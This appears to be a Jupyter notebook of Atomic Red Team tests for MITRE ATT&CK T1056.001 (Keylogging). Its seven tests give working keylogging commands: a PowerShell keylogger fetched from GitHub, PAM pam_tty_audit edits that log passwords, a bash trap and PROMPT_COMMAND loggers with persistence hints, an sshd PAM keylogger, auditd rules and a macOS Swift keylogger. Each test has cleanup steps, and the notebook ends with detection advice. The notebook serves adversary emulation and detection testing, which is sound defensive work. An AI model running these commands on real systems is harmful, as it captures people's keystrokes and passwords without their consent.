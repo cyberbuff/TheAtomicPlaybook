{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "1513d7c7",
   "metadata": {},
   "source": "# T1056.001 - Keylogging\nAdversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) "
  },
  {
   "cell_type": "markdown",
   "id": "a94b44aa",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "ea10d680",
   "metadata": {},
   "source": "### Atomic Test #1 - Input Capture\nUtilize PowerShell and external resource to capture keystrokes\n[Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)\nProvided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)\n\nUpon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Get-Keystrokes PowerShell script must exist on disk at PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1 -OutFile PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1     \n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4b6c9f9f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "4c84d9b7",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1 -LogPath $env:TEMP\\key.log\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d7507aa5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "769a789e",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item $env:TEMP\\key.log -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "da56a4ec",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "7b1bdc2f",
   "metadata": {},
   "source": "### Atomic Test #2 - Living off the land Terminal Input Capture on Linux with pam.d\nPluggable Access Module, which is present on all modern Linux systems, generally contains a library called pam_tty_audit.so which logs all keystrokes for the selected users and sends it to audit.log.  All terminal activity on any new logins would then be archived and readable by an adversary with elevated privledges.\n\nPasswords hidden by the console can also be logged, with 'log_passwd' as in this example.  If root logging is enabled, then output from any process which is later started by root is also logged, even if this policy is carefully enabled (e.g. 'disable=*' as the initial command).\n\nUse 'aureport --tty' or other audit.d reading tools to read the log output, which is binary.  Mac OS does not currently contain the pam_tty_audit.so library. \n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Checking if pam_tty_audit.so is installed\n\n##### Check Prereq Commands:\n```sh\ntest -f '/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so'\n\n```\n##### Get Prereq Commands:\n```sh\necho \"Sorry, you must install module pam_tty_audit.so and recompile, for this test to work\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b4038e5b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "13845f58",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nif sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk sudo touch /tmp/system-auth.bk sudo echo \"session    required    pam_tty_audit.so enable=* log_password\" >> /etc/pam.d/password-auth sudo echo \"session    required    pam_tty_audit.so enable=* log_password\" >> /etc/pam.d/system-auth```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e1ac709c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "dbb9b30a",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth\nsudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d247e4df",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "8b4e3ea7",
   "metadata": {},
   "source": "### Atomic Test #3 - Logging bash history to syslog\nThere are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable and can be configured to write the latest \"bash history\" entries to the syslog.\n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: This test requires to be run in a bash shell and that logger and tee are installed.\n\n##### Check Prereq Commands:\n```sh\nif [ \"$(echo $SHELL)\" != \"/bin/bash\" ]; then echo -e \"\\n***** Bash not running! *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v logger)\" ]; then echo -e \"\\n***** logger NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v tee)\" ]; then echo -e \"\\n***** tee NOT installed *****\\n\"; exit 1; fi\n\n```\n##### Get Prereq Commands:\n```sh\necho \"\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1823ded5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "20c48d48",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nPROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t \"$USER[$$] $SSH_CONNECTION \")'\necho \"\\$PROMPT_COMMAND=$PROMPT_COMMAND\"\ntail /var/log/syslog\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "476f03cd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "ba56adbe",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nunset PROMPT_COMMAND\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "537a86b8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "1b651ffd",
   "metadata": {},
   "source": "### Atomic Test #4 - Bash session based keylogger\nWhen a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\". The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger. \n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: This test requires to be run in a bash shell\n\n##### Check Prereq Commands:\n```sh\nif [ \"$(echo $SHELL)\" != \"/bin/bash\" ]; then echo -e \"\\n***** Bash not running! *****\\n\"; exit 1; fi\n\n```\n##### Get Prereq Commands:\n```sh\necho \"\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "15ac9e57",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "d1ac7443",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ntrap 'echo \"$(date +\"%d/%m/%y %H:%M:%S.%s\") $USER $BASH_COMMAND\" >> /tmp/.keyboard.log' DEBUG\necho \"Hello World!\"\ncat /tmp/.keyboard.log\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "30da9c0a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "77f24c9f",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm /tmp/.keyboard.log\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "468633cf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "e3e4a47a",
   "metadata": {},
   "source": "### Atomic Test #5 - SSHD PAM keylogger\nLinux PAM (Pluggable Authentication Modules) is used in sshd authentication. The Linux audit tool auditd can use the pam_tty_audit module to enable auditing of TTY input and capture all keystrokes in a ssh session and place them in the /var/log/audit/audit.log file after the session closes.\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: This test requires sshd and auditd\n\n##### Check Prereq Commands:\n```sh\nif [ ! -x \"$(command -v sshd)\" ]; then echo -e \"\\n***** sshd NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v auditd)\" ]; then echo -e \"\\n***** auditd NOT installed *****\\n\"; exit 1; fi\n\n```\n##### Get Prereq Commands:\n```sh\necho \"\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3a6ed0e1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "eac51846",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ncp -v /etc/pam.d/sshd /tmp/\necho \"session required pam_tty_audit.so disable=* enable=* open_only log_passwd\" >> /etc/pam.d/sshd\nsystemctl restart sshd\nsystemctl restart auditd\nssh ubuntu@localhost \nwhoami\nsudo su\nwhoami\nexit\nexit\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b0aa395f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "720867b3",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\ncp -fv /tmp/sshd /etc/pam.d/\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b5452b8f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "e00b7627",
   "metadata": {},
   "source": "### Atomic Test #6 - Auditd keylogger\nThe linux audit tool auditd can be used to capture 32 and 64 bit command execution and place the command in the /var/log/audit/audit.log audit log. \n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: This test requires sshd and auditd\n\n##### Check Prereq Commands:\n```sh\nif [ ! -x \"$(command -v auditd)\" ]; then echo -e \"\\n***** auditd NOT installed *****\\n\"; exit 1; fi\n\n```\n##### Get Prereq Commands:\n```sh\necho \"\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c72c7051",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "118a85f5",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nauditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start $(date +\"%d/%m/%y %H:%M:%S\") \n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2a8690d0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "399833a4",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsystemctl restart auditd\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7b3cb891",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d27cb166",
   "metadata": {},
   "source": "### Atomic Test #7 - MacOS Swift Keylogger\nUtilizes a swift script to log keys to sout. It runs for 5 seconds then dumps the output to standard. Input Monitoring is required.\nInput Monitoring can be enabled in System Preferences > Security & Privacy > Privacy > Input Monitoring.\nReferece: https://cedowens.medium.com/taking-esf-for-a-nother-spin-6e1e6acd1b74\n\n**Supported Platforms:** macos\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `bash`!\n##### Description: swift script must exist at #{swift_src}, and the terminal must have input monitoring permissions.\n\n##### Check Prereq Commands:\n```bash\nif [ -f PathToAtomicsFolder/T1056.001/src/MacOSKeylogger.swift ]; then chmod +x PathToAtomicsFolder/T1056.001/src/MacOSKeylogger.swift; else exit 1; fi\n\n```\n##### Get Prereq Commands:\n```bash\necho \"\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f40abe8a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "d169fb82",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nswift PathToAtomicsFolder/T1056.001/src/MacOSKeylogger.swift -keylog\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f9bbfb87",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "dd4a584f",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nkill `pgrep swift-frontend`\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "61c79528",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "8cbeef93",
   "metadata": {},
   "source": "## Detection\nKeyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`.(Citation: Adventures of a Keystroke) Monitor the Registry and file system for such changes, monitor driver installs, and look for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}